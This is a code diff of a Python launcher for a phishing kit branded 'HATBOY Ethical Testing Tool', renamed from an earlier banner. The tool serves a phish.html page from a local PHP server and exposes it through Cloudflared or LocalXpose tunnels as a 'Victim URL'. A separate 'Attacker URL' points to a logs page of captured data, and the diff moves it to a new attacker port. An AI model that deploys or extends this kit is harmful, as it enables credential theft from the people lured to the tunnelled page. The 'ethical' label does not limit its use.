@@ -4,19 +4,21 @@ import subprocess
 import platform
 import shutil
 import time
+from http.server import HTTPServer, SimpleHTTPRequestHandler
 
 CONFIG_FILE = "config.json"
 
 # Display a professional tool banner
 def display_banner():
     print("\033[1;92m")
-    print(" ██████╗ ██╗  ██╗██╗██████╗  ██████╗ ██╗   ██╗")
-    print("██╔════╝ ██║  ██║██║██╔══██╗██╔═══██╗██║   ██║")
-    print("██║  ███╗███████║██║██████╔╝██║   ██║██║   ██║")
-    print("██║   ██║██╔══██║██║██╔═══╝ ██║   ██║██║   ██║")
-    print("╚██████╔╝██║  ██║██║██║     ╚██████╔╝╚██████╔╝")
-    print(" ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝      ╚═════╝  ╚═════╝ ")
+    print("██╗  ██╗ █████╗ ████████╗██████╗  ██████╗ ██╗   ██╗")
+    print("██║  ██║██╔══██╗╚══██╔══╝██╔══██╗██╔═══██╗██║   ██║")
+    print("███████║███████║   ██║   ██████╔╝██║   ██║██║   ██║")
+    print("██╔══██║██╔══██║   ██║   ██   ██╗██║   ██║██║   ██║")
+    print("██║  ██║██║  ██║   ██║   ██████╔╝╚██████╔╝╚██████╔╝")
+    print("╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝  ╚═════╝  ╚═██║═╝ ")
     print("\033[1;94m")
+    print("                H A T B O Y")
     print("         Ethical Testing Tool v2.0")
     print("\033[1;93m")
     print("       Developed by Mister-God")
@@ -28,7 +30,7 @@ def load_config():
         with open(CONFIG_FILE, "r") as file:
             return json.load(file)
     else:
-        return {"localxpose_token": "", "port": "8080"}
+        return {"localxpose_token": "", "port": "8080", "attacker_port": "9090"}
 
 # Save configuration to file
 def save_config(config):
@@ -132,13 +134,14 @@ def start_localxpose(port, token):
 def start_php_server(port):
     print(f"[*] Starting PHP server on port {port}...")
     os.chdir(".server/www")
-    subprocess.Popen(["php", "-S", f"127.0.0.1:{port}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen([f"php", "-S", f"127.0.0.1:{port}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     os.chdir("../..")
 
 # Main menu
 def main_menu():
     config = load_config()
     port = config.get("port", "8080")
+    attacker_port = config.get("attacker_port", "9090")
     print("[*] Select an option:")
     print("[1] Localhost")
     print("[2] Cloudflared")
@@ -148,13 +151,13 @@ def main_menu():
     if choice == "1":
         start_php_server(port)
         print(f"[+] Victim URL: http://127.0.0.1:{port}/phish.html")
-        print(f"[+] Attacker URL: http://127.0.0.1:{port}/logs.html")
+        print(f"[+] Attacker URL: http://127.0.0.1:{attacker_port}/logs.html")
     elif choice == "2":
         start_php_server(port)
         tunnel_url = start_cloudflared(port)
         if tunnel_url:
             print(f"[+] Victim Tunnel URL: {tunnel_url}/phish.html")
-            print(f"[+] Attacker URL: http://127.0.0.1:{port}/logs.html")
+            print(f"[+] Attacker URL: http://127.0.0.1:{attacker_port}/logs.html")
         else:
             print("[!] Unable to create Cloudflared tunnel.")
     elif choice == "3":
@@ -167,7 +170,7 @@ def main_menu():
         tunnel_url = start_localxpose(port, token)
         if tunnel_url:
             print(f"[+] Victim Tunnel URL: {tunnel_url}/phish.html")
-            print(f"[+] Attacker URL: http://127.0.0.1:{port}/logs.html")
+            print(f"[+] Attacker URL: http://127.0.0.1:{attacker_port}/logs.html")
         else:
             print("[!] Unable to create LocalXpose tunnel.")
     else:
